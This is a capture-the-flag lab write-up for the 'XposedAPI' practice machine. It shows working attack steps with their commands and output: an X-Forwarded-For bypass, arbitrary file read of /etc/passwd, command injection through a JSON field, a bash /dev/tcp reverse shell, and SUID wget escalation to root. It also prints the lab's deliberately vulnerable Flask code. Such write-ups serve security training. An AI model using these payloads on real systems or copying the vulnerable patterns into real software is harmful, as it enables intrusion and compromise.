### XposedAPI Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.168.134

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ nmap -sCV -A 192.168.168.134 -p22,13337 -oN nmapscan           
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 16:05 WAT
Nmap scan report for 192.168.168.134
Host is up (0.29s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
13337/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.01 seconds
```

Only 2 tcp ports open 

Lets check out the web server
![image](https://user-images.githubusercontent.com/113513376/214944352-21a8be8a-0e55-48fc-a3a9-e5bed7326193.png)
![image](https://user-images.githubusercontent.com/113513376/214944387-8ad02129-0fb3-4c83-9b85-60489ef4ffdb.png)

Cool its more of an api endpoints

Lets check it out

I'll check out the first route which is `/version` using curl 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl http://192.168.168.134:13337/version                                                         
1.0.0b8f887f33975ead915f336f57f0657180                                                                                                                                                                                                                   
```

Ok it gives the version but that isn't really important as this web server isn't a known framework or sth

Anyways lets check the next route which is `/update` 

But it requires the following data in the post request

```
Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"} 
```

So i'll save this in a file called `send.json` where i'll put the required data

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ nano send.json
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ cat send.json
 {"user":"test", "url":"http://192.168.45.5/"} 
```

I'll set a python listener on port 80

So lets check it out

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl http://192.168.168.134:13337/update -X POST -H "Content-Type: application/json" -d @send.json 
Invalid username.    
```

We get a invalid username error 

So the webserver validates the username being sent

Since we don't know one for now lets check the other route which is `/logs`

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl http://192.168.168.134:13337/logs                                                            
WAF: Access Denied for this Host.                                                                                                                                                                                                                   
```

We get blocked cause the request isn't coming from the localhost

This can be bypassed by using the `X-Forwarded-For` header 

Lets try it out again

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl http://192.168.168.134:13337/logs -H "X-Forwarded-For: localhost"
Error! No file specified. Use file=/path/to/log/file to access log files.                                                                                                                                                                                                                   
``` 

Now that worked 

But it requires a GET parameter to read files

So i'll make another request but this time reading `/etc/passwd` file

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl 'http://192.168.168.134:13337/logs?file=/etc/passwd' -H "X-Forwarded-For: localhost" 
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        <br>
        <br>
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        <br>
        <br>
        <div class="divmain">
            <h3>Log:</h3>
            <div class="divmin">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

            </div>
        </div>
    </body>
</html>
```

Ah sweet we can read local file with this 

Now I tried reading sshkeys but it didn't work

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl 'http://192.168.168.134:13337/logs?file=/home/clumsyadmin/.ssh/id_rsa' -H "X-Forwarded-For: localhost" 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

So at this point lets see if we can read the source code for the web server

The web requests doesn't really show the programming language the web server uses so i tried reading source code that different languages uses

Like for example in js its `index.js` and for python its `main.py` 

So main.py worked meaning the web server is built using python

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl 'http://192.168.168.134:13337/logs?file=main.py' -H "X-Forwarded-For: localhost" 
```

Here's the result

```
            #!/usr/bin/env python3                                                                                                                                                                                 
from flask import Flask, jsonify, request, render_template, Response                                                                                                                                               
from Crypto.Hash import MD5                                                                                                                                                                                        
import json, os, binascii                                                                                                                                                                                          
app = Flask(__name__)                                                                                                                                                                                              
                                                                                                                                                                                                                   
@app.route(&#39;/&#39;)                                                                                                                                                                                            
def home():                                                                                                                                                                                                        
    return(render_template(&#34;home.html&#34;))                                                                                                                                                                   
                                                                                                                                                                                                                   
@app.route(&#39;/update&#39;, methods = [&#34;POST&#34;])                                                                                                                                                          
def update():                                                                                                                                                                                                      
    if request.headers[&#39;Content-Type&#39;] != &#34;application/json&#34;:                                                                                                                                      
        return(&#34;Invalid content type.&#34;)
    else:
        data = json.loads(request.data)
        if data[&#39;user&#39;] != &#34;clumsyadmin&#34;:
            return(&#34;Invalid username.&#34;)
        else:
            os.system(&#34;curl {} -o /home/clumsyadmin/app&#34;.format(data[&#39;url&#39;]))
            return(&#34;Update requested by {}. Restart the software for changes to take effect.&#34;.format(data[&#39;user&#39;]))

@app.route(&#39;/logs&#39;)
def readlogs():
  if request.headers.getlist(&#34;X-Forwarded-For&#34;):
        ip = request.headers.getlist(&#34;X-Forwarded-For&#34;)[0]
  else:
        ip = &#34;1.3.3.7&#34;
  if ip == &#34;localhost&#34; or ip == &#34;127.0.0.1&#34;:
    if request.args.get(&#34;file&#34;) == None:
        return(&#34;Error! No file specified. Use file=/path/to/log/file to access log files.&#34;, 404)
    else:
        data = &#39;&#39;
        with open(request.args.get(&#34;file&#34;), &#39;r&#39;) as f:
            data = f.read()
            f.close()
        return(render_template(&#34;logs.html&#34;, data=data))
  else:
       return(&#34;WAF: Access Denied for this Host.&#34;,403)

@app.route(&#39;/version&#39;)
def version():
    hasher = MD5.new()
    appHash = &#39;&#39;
    with open(&#34;/home/clumsyadmin/app&#34;, &#39;rb&#39;) as f:
        d = f.read()
        hasher.update(d)
        appHash = binascii.hexlify(hasher.digest()).decode()
    return(&#34;1.0.0b{}&#34;.format(appHash))

@app.route(&#39;/restart&#39;, methods = [&#34;GET&#34;, &#34;POST&#34;])
def restart():
    if request.method == &#34;GET&#34;:
        return(render_template(&#34;restart.html&#34;))
    else:
        os.system(&#34;killall app&#34;)
        os.system(&#34;bash -c &#39;/home/clumsyadmin/app&amp;&#39;&#34;)
        return(&#34;Restart Successful.&#34;)
```

It doesn't look pretty so i edited it to 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]                                                                                                                                                                   
└─$ cat source.py                                                                                                                                                                                                  
#!/usr/bin/env python3                                                                                                                                                                                             
from flask import Flask, jsonify, request, render_template, Response                                                                                                                                               
from Crypto.Hash import MD5                                                                                                                                                                                        
import json, os, binascii                                                                                                                                                                                          
app = Flask(__name__)                                                                                                                                                                                              
                                                                                                                                                                                                                   
@app.route('/')                                                                                                                                                                                                    
def home():                                                                                                                                                                                                        
    return(render_template('home.html'))                                                                                                                                                                           
                                                                                                                                                                                                                   
@app.route('/' methods = ['POST'])
def update():
    if request.headers['Content-Type'] != 'application/json':
        return('Invalid content type.')
    else:
        data = json.loads(request.data)
        if data['user'] != 'clumsyadmin':
            return('Invalid username.')
        else:
            os.system('curl {} -o /home/clumsyadmin/app'.format(data['url']))
            return('Update requested by {}. Restart the software for changes to take effect.'.format(data['user']))

@app.route('/logs')
def readlogs():
  if request.headers.getlist('X-Forwarded-For'):
        ip = request.headers.getlist('X-Forwarded-For')[0]
  else:
        ip = '1.3.3.7'
  if ip == 'localhost' or ip == '127.0.0.1':
    if request.args.get('file') == None:
        return('Error! No file specified. Use file=/path/to/log/file to access log files.', 404)
    else:
        data = ''
        with open(request.args.get('file'), 'r') as f:
            data = f.read()
            f.close()
        return(render_template('logs.html', data=data))
  else:
       return('WAF: Access Denied for this Host.',403)

@app.route('/version')
def version():
    hasher = MD5.new()
    appHash = ''
    with open('/home/clumsyadmin/app', 'rb') as f:
        d = f.read()
        hasher.update(d)
        appHash = binascii.hexlify(hasher.digest()).decode()
    return('1.0.0b{}'.format(appHash))
@app.route('/restart', methods = ['GET', 'POST'])
def restart():
    if request.method == 'GET':
        return(render_template('restart.html'))
    else:
        os.system('killall app')
        os.system('bash -c '/home/clumsyadmin/app'') 
        return('Restart Successful.')
```

Now the route that looks interesting to us is the `/update` endpoint

What it does is this 

```
1. It checks the request if its content type is application/json
2. If it isn't it throws back an error
3. But if it isn't it then reads the data 
4. If the username parameter is clumsyadmin it does curl on the url we provided
5. If it isn't it prints incorrect username
```

Now that we know the required parameter to pass through the request

I'll try command injection since no form of filtering is done when curl is being called

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ cat send.json
 {"user":"clumsyadmin", "url":"; $(ping -c 5 192.168.45.5)"} 
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl http://192.168.168.134:13337/update -X POST -H "Content-Type: application/json" -d @send.json
Update requested by clumsyadmin. Restart the software for changes to take effect.  
```

Back on tcpdump we get ping traffic

```
┌──(mark__haxor)-[~/Desktop/B2B/Pg/Practice]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for mark: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:59:39.119674 IP 192.168.168.134 > haxor: ICMP echo request, id 929, seq 1, length 64
21:59:39.119699 IP haxor > 192.168.168.134: ICMP echo reply, id 929, seq 1, length 64
21:59:40.073187 IP 192.168.168.134 > haxor: ICMP echo request, id 929, seq 2, length 64
21:59:40.073202 IP haxor > 192.168.168.134: ICMP echo reply, id 929, seq 2, length 64
21:59:41.071858 IP 192.168.168.134 > haxor: ICMP echo request, id 929, seq 3, length 64
21:59:41.071877 IP haxor > 192.168.168.134: ICMP echo reply, id 929, seq 3, length 64
21:59:42.092918 IP 192.168.168.134 > haxor: ICMP echo request, id 929, seq 4, length 64
21:59:42.092939 IP haxor > 192.168.168.134: ICMP echo reply, id 929, seq 4, length 64
21:59:43.077390 IP 192.168.168.134 > haxor: ICMP echo request, id 929, seq 5, length 64
21:59:43.077405 IP haxor > 192.168.168.134: ICMP echo reply, id 929, seq 5, length 64
```

Now lets get a reverse shell

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ cat send.json
 {"user":"clumsyadmin", "url":"; $(bash -c 'bash -i >& /dev/tcp/192.168.45.5/1337 0>&1')"} 
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ curl http://192.168.168.134:13337/update -X POST -H "Content-Type: application/json" -d @send.json
```

Back on the netcat listener we get a connection 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/XposedAPI]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.168.134] 49324
bash: cannot set terminal process group (466): Inappropriate ioctl for device
bash: no job control in this shell
clumsyadmin@xposedapi:~/webapp$ 
```

Now lets stabilize

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Now lets get root

Checking binaries with suid perm set on it shows that `wget` is an suid binary

```
clumsyadmin@xposedapi:~$ find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/wget
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
clumsyadmin@xposedapi:~$
```

Now on checking [gtfobins](https://gtfobins.github.io/gtfobins/wget/#suid)

We can use it and get root

```
clumsyadmin@xposedapi:~$ TF=$(mktemp)
clumsyadmin@xposedapi:~$ chmod +x $TF
clumsyadmin@xposedapi:~$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
clumsyadmin@xposedapi:~$ wget --use-askpass=$TF 0
# id
uid=1000(clumsyadmin) gid=1000(clumsyadmin) euid=0(root) groups=1000(clumsyadmin)
# cd /root
# ls -al
total 20
drwx------  2 root root 4096 Jan 26 15:31 .
drwxr-xr-x 18 root root 4096 Feb  9  2021 ..
lrwxrwxrwx  1 root root    9 Feb  9  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  595 Oct 27  2020 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Jan 26 15:32 proof.txt
# cat proof.txt
bbe0c4280b9defd3ee12de7d4750368c
#
```

And we're done


<br> <br>
[Back To Home](../../index.md)
<br>



